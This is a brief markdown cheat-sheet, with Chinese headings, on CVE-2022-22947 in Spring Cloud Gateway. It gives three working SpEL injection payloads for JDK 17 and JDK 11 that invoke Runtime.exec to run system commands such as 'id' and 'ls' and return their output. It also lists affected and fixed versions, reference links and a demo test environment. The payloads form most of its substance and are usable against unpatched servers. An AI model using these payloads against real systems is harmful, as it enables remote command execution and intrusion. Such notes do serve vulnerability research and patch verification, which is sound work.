### CVE-2022-22947
jdk17
```
#{new java.util.Scanner(T(java.lang.Process).getMethod('getInputStream').invoke(T(java.lang.Runtime).getRuntime().exec(new String[]{'ls'}))).useDelimiter('\A').next().replace('\n',' ')}
```
jdk11
```
#{new java.util.Scanner(''.getClass().forName('java.lang.Runtime').getRuntime().exec('id').getInputStream()).useDelimiter('\\A').next().replace('\n',' ')}
```
另外的payload：
```
#{new java.lang.String(T(org.springframework.util.StreamUtils).copyToByteArray(T(java.lang.Runtime).getRuntime().exec(new String[]{\"id\"}).getInputStream()))}
```
影响版本：
> org.springframework.cloud:spring-cloud-gateway-server
> [,3.0.7) [3.1.0,3.1.1) 

- https://tanzu.vmware.com/security/cve-2022-22947
- https://0xn3va.gitbook.io/cheat-sheets/framework/spring/spring-boot-actuators
- https://blog.viettelcybersecurity.com/cve-2022-22947-spring-cloud-gateway-code-injection-vulnerability/
- https://wya.pl/2021/12/20/bring-your-own-ssrf-the-gateway-actuator/
- https://wya.pl/2022/02/26/cve-2022-22947-spel-casting-and-evil-beans/
- https://github.com/lucksec/Spring-Cloud-Gateway-CVE-2022-22947
- https://security.snyk.io/vuln/SNYK-JAVA-ORGSPRINGFRAMEWORKCLOUD-2415033
- https://github.com/lucksec/Spring-Cloud-Gateway-CVE-2022-22947/blob/main/Spring%20Cloud%20Gateway%20Actuator%20API%20SpEL%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%EF%BC%88CVE-2022-22947%EF%BC%89.md
- https://www.pmnh.site/post/writeup_spring_el_waf_bypass/


#### 测试环境
- https://github.com/wdahlenburg/spring-gateway-demo


修复版本：3.1.1
![image](https://user-images.githubusercontent.com/30398606/175478287-fb2babf6-b69d-4147-bbef-54f7d913e606.png)


受影响版本：
```
org.springframework.cloud:spring-cloud-gateway-server@[3.1.0, 3.1.1)
org.springframework.cloud:spring-cloud-gateway-server@[2.2.6.RELEASE, 3.0.7)
```
![image](https://user-images.githubusercontent.com/30398606/175480199-c483b215-0511-4f7e-94ef-faad4f6353e9.png)


